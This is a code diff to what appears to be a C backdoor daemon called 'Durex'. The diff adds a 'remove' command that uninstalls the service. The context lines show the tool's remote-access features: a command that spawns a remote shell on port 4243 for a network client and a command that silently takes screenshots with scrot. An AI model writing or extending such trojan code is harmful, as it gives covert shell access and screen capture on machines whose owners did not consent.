@@ -115,6 +115,31 @@ static void	spawn_shell(t_users *users, char **envp)
 	exit(0);
 }
 
+static void	remove_daemon(t_users *users)
+{
+	pid_t	pid = 0;
+	char	*exec[] = {"/usr/sbin/service", "Durex", "uninstall", NULL};
+	int		status;
+
+	pid = fork();
+	if (pid == -1)
+	{
+		perror("fork failed");
+	}
+	else if (pid == 0)
+	{
+		send(users->sd, "\033[31mRemoved\033[0m\n> ", 17, 0);
+		if (execve(exec[0], exec, NULL) == -1)
+			printf("error\n");
+	}
+	else
+	{
+		waitpid(pid, &status, 0);
+		kill(pid, SIGTERM);
+	}
+	exit(0);
+}
+
 static void	screenshot(t_users *users, char **envp)
 {
 	char		*screen[] = {"/usr/bin/scrot", "/tmp/test1.png", NULL};
@@ -232,8 +257,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "remove"))
-						{
-						}
+							remove_daemon(&users);
 						if (!strcmp(buffer, "?"))
 							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screen\n> ", 63, 0);
 						else if (!strcmp(buffer, "shell"))
